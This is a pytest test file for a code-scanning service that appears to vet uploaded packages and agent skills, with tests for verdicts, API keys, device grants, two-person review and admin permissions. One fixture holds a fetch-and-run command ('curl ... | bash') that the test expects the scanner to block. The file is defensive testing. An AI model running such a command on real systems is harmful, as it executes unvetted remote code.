import time

from aag.models import APIKey, DeviceGrant, Job, Usage
from conftest import login, upload, wait_job
from sqlalchemy import select


def test_scan_policy_cache_and_export(client):
    job = wait_job(client, upload(client))
    assert job["status"] == "COMPLETED" and job["verdict"] == "ALLOW"
    cached = wait_job(client, upload(client))
    assert cached["cached_from"] == job["id"]
    blocked = wait_job(
        client, upload(client, {"install.sh": "curl https://example.com/install | bash"})
    )
    assert blocked["verdict"] == "BLOCK"
    assert blocked["result"]["findings"][0]["severity"] == "critical"
    assert (
        client.get(f"/api/scans/{blocked['id']}/export?format=sarif").json()["version"] == "2.1.0"
    )


def test_full_profile_and_missing_engines_never_allow(client):
    job = wait_job(client, upload(client, profile="full"))
    assert job["profile"] == "full"
    assert job["verdict"] == "REVIEW"
    assert not job["result"]["coverage_complete"]
    skill = wait_job(
        client, upload(client, {"SKILL.md": "---\nname: example\n---\nRead instructions."})
    )
    assert skill["verdict"] == "REVIEW"


def test_owner_isolation_and_key_scope(client, people):
    alice = {"Authorization": "Bearer " + people["alice"]["token"]}
    bob = {"Authorization": "Bearer " + people["bob"]["token"]}
    j = upload(client, headers=alice)
    wait_job(client, j, headers=alice)
    assert client.get("/api/scans/" + j, headers=bob).status_code == 404
    assert client.get("/api/scans", headers=bob).json()["total"] == 0
    assert client.get("/api/admin/users", headers=alice).status_code == 403
    assert client.post("/api/api-keys", json={"name": "escalate"}, headers=alice).status_code == 403
    key = client.post("/api/api-keys", json={"name": "readonly", "scopes": ["scan:read"]}).json()
    assert (
        client.post(
            "/api/scans",
            headers={"Authorization": "Bearer " + key["token"]},
            json={"url": "https://github.com/o/r"},
        ).status_code
        == 403
    )


def test_key_once_revoke_usage(client, app):
    created = client.post("/api/api-keys", json={"name": "ci", "days": 7}).json()
    token = created["token"]
    assert token.startswith("aag_sk_")
    headers = {"Authorization": "Bearer " + token}
    assert client.get("/api/scans", headers=headers).status_code == 200
    listing = client.get("/api/api-keys")
    assert token not in listing.text
    assert listing.json()[0]["requests_30d"] == 1
    with app.state.db.session() as s:
        key = s.get(APIKey, created["id"])
        assert token not in key.digest and key.last_used_at
    assert (
        client.post(
            "/api/api-keys/" + created["id"] + "/revoke", json={"reason": "No longer used"}
        ).status_code
        == 200
    )
    assert client.get("/api/scans", headers=headers).status_code == 401


def test_device_one_time_expiry_and_poll_interval(client, app):
    c = client.post("/api/device-clients", json={"name": "OpenCode"}).json()
    grant = client.post("/api/device/authorize", json={"client_id": c["id"]}).json()
    body = {"client_id": c["id"], "device_code": grant["device_code"]}
    assert len(grant["user_code"]) == 8
    assert client.post("/api/device/token", json=body).json()["error"] == "authorization_pending"
    assert client.post("/api/device/token", json=body).json()["error"] == "slow_down"
    assert (
        client.get("/api/device/verify/" + grant["user_code"]).json()["client_name"] == "OpenCode"
    )
    assert (
        client.post(
            "/api/device/decision", json={"user_code": grant["user_code"], "approve": True}
        ).status_code
        == 200
    )
    assert (
        client.post(
            "/api/device/decision", json={"user_code": grant["user_code"], "approve": True}
        ).status_code
        == 409
    )
    with app.state.db.session.begin() as s:
        g = s.scalar(select(DeviceGrant))
        g.last_poll_at = 0
    response = client.post("/api/device/token", json=body)
    assert response.status_code == 200 and response.json()["access_token"].startswith("aag_sk_")
    with app.state.db.session.begin() as s:
        g = s.scalar(select(DeviceGrant))
        g.last_poll_at = 0
    assert client.post("/api/device/token", json=body).json()["error"] == "access_denied"
    with app.state.db.session.begin() as s:
        s.scalar(select(DeviceGrant)).expires_at = time.time() - 1
    assert client.post("/api/device/token", json=body).json()["error"] == "expired_token"


def test_review_two_person_and_original_verdict(client, people):
    login(client, "alice")
    job = wait_job(client, upload(client, {"run.py": "import os\nos.system('echo hi')"}))
    assert job["verdict"] == "REVIEW"
    review = client.post(
        f"/api/scans/{job['id']}/review", json={"reason": "Read-only operation verified"}
    ).json()
    assert (
        client.post(
            f"/api/reviews/{review['id']}/decision",
            json={"decision": "approved", "reason": "Self approval attempt"},
        ).status_code
        == 403
    )
    login(client, "reviewer")
    assert (
        client.post(
            f"/api/reviews/{review['id']}/decision",
            json={"decision": "approved", "reason": "Reviewed process boundary"},
        ).status_code
        == 200
    )
    approved = client.get("/api/scans/" + job["id"]).json()
    assert approved["verdict"] == "REVIEW" and approved["effective_verdict"] == "ALLOW"
    assert (
        client.post(
            f"/api/reviews/{review['id']}/decision",
            json={"decision": "rejected", "reason": "Conflicting review attempt"},
        ).status_code
        == 409
    )


def test_review_missing_coverage_and_reviewer_orthogonal(client, people):
    login(client, "alice")
    j = wait_job(client, upload(client, profile="full"))
    r = client.post(
        f"/api/scans/{j['id']}/review", json={"reason": "Check missing scanner coverage"}
    ).json()
    login(client, "reviewer")
    assert (
        client.post(
            "/api/reviews/" + r["id"] + "/decision",
            json={"decision": "approved", "reason": "Should not pass incomplete"},
        ).status_code
        == 409
    )
    assert client.get("/api/admin/users").status_code == 403
    assert client.get("/api/metrics?scope=all").status_code == 403
    assert client.get("/api/metrics?scope=review").status_code == 200


def test_metrics_days_zero_fill_and_provider_usage(client, app):
    owner = client.get("/api/auth/me").json()["id"]
    with app.state.db.session.begin() as s:
        s.add_all(
            [
                Usage(
                    user_id=owner,
                    kind="llm",
                    provider="onprem",
                    model="local",
                    input_tokens=100,
                    output_tokens=12,
                ),
                Usage(
                    user_id=owner,
                    kind="llm",
                    provider="bedrock",
                    model="cloud",
                    input_tokens=None,
                    output_tokens=None,
                    status=503,
                ),
            ]
        )
    for days in (7, 14, 30, 90):
        r = client.get(f"/api/metrics?days={days}&scope=all")
        assert r.status_code == 200, r.text
        assert len(r.json()["series"]) == days
    metrics = r.json()
    providers = {m["provider"]: m for m in metrics["models"]}
    assert providers["onprem"]["input_tokens"] == 100
    assert providers["bedrock"]["input_tokens"] is None
    assert providers["bedrock"]["missing_input_usage"] == 1
    assert all(m["cost_usd"] is None for m in metrics["models"])
    assert client.get("/api/metrics?days=365").status_code == 422
    assert "provider" in client.get("/api/usage/export").text


def test_permission_last_admin_and_disabled_user(client, people):
    me = client.get("/api/auth/me").json()
    assert (
        client.patch(
            "/api/admin/users/" + me["id"], json={"role": "user", "reviewer": True, "active": True}
        ).status_code
        == 409
    )
    assert (
        client.patch(
            "/api/admin/users/" + people["alice"]["id"],
            json={"role": "user", "reviewer": True, "active": False},
        ).status_code
        == 200
    )
    assert (
        client.get(
            "/api/scans", headers={"Authorization": "Bearer " + people["alice"]["token"]}
        ).status_code
        == 401
    )


def test_restart_marks_pending_failed(app, client):
    owner = client.get("/api/auth/me").json()["id"]
    with app.state.db.session.begin() as s:
        j = Job(owner_id=owner, source="upload.zip", source_type="upload", profile="static")
        s.add(j)
        s.flush()
        jid = j.id
    app.state.scans.recover()
    assert client.get("/api/scans/" + jid).json()["status"] == "FAILED"
